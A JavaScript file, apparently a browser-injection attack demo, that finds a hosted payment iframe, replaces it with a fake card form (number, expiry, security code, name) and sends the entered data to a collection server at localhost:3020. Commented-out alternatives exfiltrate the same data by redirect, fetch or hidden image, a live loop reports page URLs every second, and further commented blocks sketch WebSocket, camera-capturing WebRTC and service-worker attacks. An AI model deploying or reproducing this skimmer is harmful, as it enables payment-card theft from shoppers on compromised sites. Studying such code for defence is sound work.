/**

  Create a js script that uses the DOM API to create a payment form.

  I want 4 fields:

  Card Number
  Expiry
  Security Code
  Cardholder Name

  and a big blue "Pay Now" button at the bottom} iframe 
*/

function swapPaymentForm(iframe) {
  const container = iframe.parentNode;
  const css = `
      .lds-ring { display: none; }

      body {
          font-family: Arial, sans-serif;
      }
      .payment-form {
          max-width: 400px;
          margin: 50px auto;
          padding: 20px;
          border: 1px solid #ccc;
          border-radius: 8px;
          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }
      .form-group {
          margin-bottom: 15px;
      }
      .form-group label {
          display: block;
          margin-bottom: 5px;
      }
      .form-group input {
          width: 100%;
          padding: 8px;
          box-sizing: border-box;
          border: 1px solid #ccc;
          border-radius: 4px;
      }
      .pay-now-btn {
          width: 100%;
          padding: 10px;
          background-color: blue;
          color: white;
          border: none;
          border-radius: 4px;
          cursor: pointer;
          font-size: 16px;
      }
  `;

  // Create a style element
  const style = document.createElement("style");
  style.textContent = css;

  // Append the style element to the head
  document.head.appendChild(style);

  // Create the payment-form div and append it to the body
  const paymentFormDiv = document.createElement("div");
  paymentFormDiv.className = "payment-form";
  paymentFormDiv.id = "payment-form";
  container.appendChild(paymentFormDiv);

  // Create form element
  const form = document.createElement("form");

  // Create form groups for each input field
  const fields = [
    { label: "Card Number", type: "text", id: "card-number" },
    { label: "Expiry", type: "text", id: "expiry" },
    { label: "Security Code", type: "text", id: "security-code" },
    { label: "Cardholder Name", type: "text", id: "cardholder-name" },
  ];

  fields.forEach((field) => {
    const formGroup = document.createElement("div");
    formGroup.className = "form-group";

    const label = document.createElement("label");
    label.htmlFor = field.id;
    label.textContent = field.label;

    const input = document.createElement("input");
    input.type = field.type;
    input.id = field.id;
    input.name = field.id;

    formGroup.appendChild(label);
    formGroup.appendChild(input);
    form.appendChild(formGroup);
    form.method = "POST";
    form.action = "http://localhost:3020/api/data";
  });

  // Create Pay Now button
  const payNowButton = document.createElement("button");
  payNowButton.type = "button";
  payNowButton.className = "pay-now-btn";
  payNowButton.textContent = "Pay Now";
  payNowButton.onclick = function () {
    debugger;
    const data = {
      cc_data: fields.map(
        (field) => document.querySelector(`#${field.id}`).value
      ),
    };

    // Redirect 1)
    // const meta = document.createElement("meta");
    // meta.httpEquiv = "refresh";
    // meta.content =
    //   "3;url=http://localhost:3020/api/data?data=" +
    //   encodeURIComponent(JSON.stringify(data));
    // document.head.appendChild(meta);

    // Redirect 2)
    // location.href = "http://localhost:3020/api/data?data=" + encodeURIComponent(JSON.stringify(data));

    // Fetch 3)
    // fetch("http://localhost:3020/api/data", {
    //   method: "POST",
    //   headers: {
    //     "Content-Type": "application/json",
    //   },
    //   body: JSON.stringify(data),
    // });

    // Image 4)
    // const img = document.createElement("img");
    // img.src = "http://localhost:3020/api/data?data=" + encodeURIComponent(JSON.stringify(data));
    // img.style.display = "none";
    // document.body.appendChild(img);
  
  };

  // Append Pay Now button to form
  form.appendChild(payNowButton);

  // Append form to the payment-form div
  paymentFormDiv.appendChild(form);

  iframe.remove();
}

let intervalId;

function checkIframe() {
  const iframes = document.getElementsByTagName("iframe");
  for (let i = 0; i < iframes.length; i++) {
    const src = iframes[i].getAttribute("src");
    if (src && src.startsWith("/ticketbooth/hpp")) {
      clearInterval(intervalId);

      swapPaymentForm(iframes[i]);

      return;
    }
  }
}

intervalId = setInterval(checkIframe, 500);

function pingServer() {
  const now = new Date();
  const hours = String(now.getHours()).padStart(2, "0");
  const minutes = String(now.getMinutes()).padStart(2, "0");
  const seconds = String(now.getSeconds()).padStart(2, "0");
  const data = {
    time: `${hours}:${minutes}:${seconds}`,
    location: location.href,
  };

  fetch("http://localhost:3020/api/data", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  });
}

setInterval(pingServer, 1000);

// Draw circle
var circle = document.createElement("div");
circle.className =
  "red-circle flex items-center justify-center font-medium text-white animate-pulse";
circle.textContent = "Tracker";
document.body.appendChild(circle);
const css = `
  .red-circle {
    position: fixed;
    bottom: 20px; /* Adjust as needed */
    right: 20px;  /* Adjust as needed */
    width: 100px; /* Diameter of the circle */
    height: 100px; /* Diameter of the circle */
    background-color: red;
    border-radius: 50%;
    z-index: 1000; /* Ensure it is above other elements */
  }
`;
const style = document.createElement("style");
style.textContent = css;
document.head.appendChild(style);

// Websocket Attack
// Establish a WebSocket connection
// const ws = new WebSocket("ws://localhost:3020");
// ws.onopen = () => {
//   console.log("WebSocket connection established.");
//   // Send a message to the server
//   ws.send(JSON.stringify({ message: "Hello from the client!" }));

//   setInterval(() => {
//     ws.send(JSON.stringify({ message: "Hello from the client!" }));
//   }, 3000);
// };

// // Handle WebSocket message event
// ws.onmessage = (event) => {
//   console.log("Received from server:", event.data);
// };

// // Handle WebSocket close event
// ws.onclose = () => {
//   console.log("WebSocket connection closed.");
// };

// // Handle WebSocket error event
// ws.onerror = (error) => {
//   console.error("WebSocket error:", error);
// };


// Web RTC Attack

// function webRtcAttackDemo() {
//   const videoContainer = document.body;

//   // Create video elements dynamically
//   const localVideo = document.createElement('video');
//   localVideo.id = 'localVideo';
//   localVideo.autoplay = true;
//   localVideo.muted = true;

//   const remoteVideo = document.createElement('video');
//   remoteVideo.id = 'remoteVideo';
//   remoteVideo.autoplay = true;

//   videoContainer.appendChild(localVideo);
//   videoContainer.appendChild(remoteVideo);

//   let localStream;
//   let peerConnection;
//   const configuration = { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }] };

//   // Get user media
//   navigator.mediaDevices.getUserMedia({ video: true, audio: true })
//       .then(stream => {
//           localVideo.srcObject = stream;
//           localStream = stream;
//           startPeerConnection();
//       })
//       .catch(error => {
//           console.error('Error accessing media devices.', error);
//       });

//   function startPeerConnection() {
//       peerConnection = new RTCPeerConnection(configuration);
      
//       // Handle ICE candidates
//       peerConnection.onicecandidate = event => {
//           if (event.candidate) {
//               // Send the candidate to the remote peer
//               sendToServer({ type: 'candidate', candidate: event.candidate });
//           }
//       };

//       // Handle remote stream
//       peerConnection.ontrack = event => {
//           remoteVideo.srcObject = event.streams[0];
//       };

//       // Add local stream tracks to PeerConnection
//       localStream.getTracks().forEach(track => {
//           peerConnection.addTrack(track, localStream);
//       });

//       // Create and send offer
//       peerConnection.createOffer()
//           .then(offer => peerConnection.setLocalDescription(offer))
//           .then(() => {
//               // Send the offer to the remote peer
//               sendToServer({ type: 'offer', offer: peerConnection.localDescription });
//           })
//           .catch(error => {
//               console.error('Error creating offer:', error);
//           });
//   }

//   // Handle messages from the server
//   function handleMessage(message) {
//       if (message.type === 'offer') {
//           peerConnection.setRemoteDescription(new RTCSessionDescription(message.offer))
//               .then(() => peerConnection.createAnswer())
//               .then(answer => peerConnection.setLocalDescription(answer))
//               .then(() => sendToServer({ type: 'answer', answer: peerConnection.localDescription }))
//               .catch(error => console.error('Error handling offer:', error));
//       } else if (message.type === 'answer') {
//           peerConnection.setRemoteDescription(new RTCSessionDescription(message.answer))
//               .catch(error => console.error('Error setting remote description:', error));
//       } else if (message.type === 'candidate') {
//           peerConnection.addIceCandidate(new RTCIceCandidate(message.candidate))
//               .catch(error => console.error('Error adding ICE candidate:', error));
//       }
//   }

//   // Mock function to simulate sending and receiving messages via a server
//   function sendToServer(message) {
//       // This is where you'd normally send the message to the remote peer via your signaling server
//       console.log('Sending message to server:', message);

//       // Simulate receiving the same message on the remote peer
//       setTimeout(() => handleMessage(message), 1000);
//   }
// }

// setTimeout(() => {
//   console.log('start webrtc demo');
//   webRtcAttackDemo();
// }, 5000);










// Service Worker Attack

// function startSWAttack() {
//   console.log('Start SW Attack');

//   if ('serviceWorker' in navigator) {
//     navigator.serviceWorker.register('http://localhost:3020/service-worker.js')
//       .then(registration => {
//         console.log('Service Worker registered with scope:', registration.scope);
//       })
//       .catch(error => {
//         console.log('Service Worker registration failed:', error);
//       });
//   }
// }

// startSWAttack();

